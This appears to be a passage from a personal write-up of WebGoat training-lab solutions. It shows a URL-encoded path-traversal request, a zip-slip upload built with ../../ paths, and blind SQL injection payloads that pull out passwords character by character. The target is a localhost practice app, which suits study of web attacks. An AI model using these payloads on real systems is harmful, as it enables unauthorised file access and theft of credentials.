<p>Open OWASP ZAP and find the GET request that is being sent when the 'Show random cat picture' button is pressed. Modify this request and resend it using the <em>Manual Request Editor</em>. Found the location by first adding just <code>%2e%2e%2f</code> to the GET request and getting 404 error message with current directory. There is a URL encoding tool in ZAP.</p>
<div class="language-text highlight"><span class="filename">GET Request</span><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>GET http://localhost:9000/WebGoat/PathTraversal/random-picture?id=%2e%2e%2f%2e%2e%2fpath-traversal-secret
</span></code></pre></div>
<h3 id="webgoat-sql-path-traversal-solution-for-exercise-7">WebGoat  SQL (Path Traversal) - Solution for exercise 7:</h3>
<div class="language-bash highlight"><span class="filename">Terminal</span><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="nb">cd</span><span class="w"> </span>/tmp/webgoat125something
</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>cp<span class="w"> </span>/location-of-some/pic.jpg<span class="w"> </span>/home/user/.webgoat/PathTraversal/webgoat/webgoat.jpg
</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>zip<span class="w"> </span>goat.zip<span class="w"> </span>../../home/user/.webgoat/PathTraversal/webgoat/webgoat.jpg
</span></code></pre></div>
<p>Then, upload the file via the WebGoat upload page.</p>
<h3 id="interesting-sql-injection-queries-i-used-to-get-necessary-info-from-the-db">Interesting SQL Injection queries I used to get necessary info from the DB:</h3>
<p></p><div class="language-text highlight"><span class="filename">Using EXISTS()</span><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>' or EXISTS(SELECT * FROM users);
</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>devon' and exists(select * from users) and '1'='1
</span></code></pre></div>
<div class="language-text highlight"><span class="filename">Using Binary Search</span><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>Tom' and length(password)&gt;0;--
</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>tom' AND ascii(substring(password,1,1)) &gt; 60;--
</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>Tom' and length(user)&gt;5;--
</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a>Tom' and ascii(substr(user,2,2))=65;--
</span><span id="__span-27-5"><a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a>Tom' and right(email,3)='com
</span></code></pre></div></div>

  
  




  



      
    </article>
  </div>

          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs Insiders
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.sections", "content.code.copy", "content.code.annotate"], "search": "../../../../assets/javascripts/workers/search.6c7302c4.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../../../assets/javascripts/bundle.10c6cd24.min.js"></script>
      
    
  </body>
</html>